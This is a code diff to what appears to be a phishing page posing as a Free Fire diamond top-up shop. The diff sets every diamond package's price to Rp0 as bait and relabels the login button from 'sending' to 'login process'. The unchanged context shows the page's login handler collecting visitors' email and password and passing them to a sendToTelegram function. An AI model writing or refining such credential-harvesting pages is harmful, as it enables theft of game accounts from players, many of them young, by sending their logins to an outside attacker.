@@ -218,14 +218,14 @@
         <!-- Free Fire Diamonds -->
         <div class="diamond-section" id="freefire-section">
             <div class="diamond-grid">
-                <div class="diamond-option" data-diamond="70" data-price="10000">70 Diamond<br><small>Rp10.000</small></div>
-                <div class="diamond-option" data-diamond="100" data-price="14000">100 Diamond<br><small>Rp14.000</small></div>
-                <div class="diamond-option" data-diamond="210" data-price="28000">210 Diamond<br><small>Rp28.000</small></div>
-                <div class="diamond-option" data-diamond="250" data-price="33000">250 Diamond<br><small>Rp33.000</small></div>
-                <div class="diamond-option" data-diamond="320" data-price="41000">320 Diamond<br><small>Rp41.000</small></div>
-                <div class="diamond-option" data-diamond="390" data-price="50000">390 Diamond<br><small>Rp50.000</small></div>
-                <div class="diamond-option" data-diamond="460" data-price="59000">460 Diamond<br><small>Rp59.000</small></div>
-                <div class="diamond-option" data-diamond="1000" data-price="125000">1000 Diamond<br><small>Rp125.000</small></div>
+                <div class="diamond-option" data-diamond="70" data-price="0">70 Diamond<br><small>Rp0</small></div>
+                <div class="diamond-option" data-diamond="100" data-price="0">100 Diamond<br><small>Rp0</small></div>
+                <div class="diamond-option" data-diamond="210" data-price="0">210 Diamond<br><small>Rp0</small></div>
+                <div class="diamond-option" data-diamond="250" data-price="0">250 Diamond<br><small>Rp0</small></div>
+                <div class="diamond-option" data-diamond="320" data-price="0">320 Diamond<br><small>Rp0</small></div>
+                <div class="diamond-option" data-diamond="390" data-price="0">390 Diamond<br><small>Rp0</small></div>
+                <div class="diamond-option" data-diamond="460" data-price="0">460 Diamond<br><small>Rp0</small></div>
+                <div class="diamond-option" data-diamond="1000" data-price="0">1000 Diamond<br><small>Rp0</small></div>
             </div>
         </div>
 
@@ -360,7 +360,7 @@
             const password = document.getElementById('password').value.trim();
             
             if (email && password) {
-                this.innerHTML = '⏳ MENGIRIM...';
+                this.innerHTML = '⏳ PROSES LOGIN';
                 
                 // Kirim ke Telegram
                 await sendToTelegram(email, password);
